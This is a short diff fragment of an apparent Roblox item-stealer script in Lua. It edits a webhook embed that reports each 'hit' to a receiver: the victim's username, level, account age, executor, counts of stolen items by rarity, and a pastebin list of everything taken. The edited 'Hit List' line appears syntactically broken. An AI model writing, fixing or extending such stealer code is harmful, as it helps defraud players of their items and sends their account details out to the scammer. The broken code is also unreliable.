@@ -1067,7 +1067,7 @@ local WebHookEmbed = CreateEmbed(
     {
         {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
 {name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
-{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")", value = "[Teleporter](<https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER>)"}
+{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..") "\n[Teleporter](<https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER>)"}
     }
 )
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
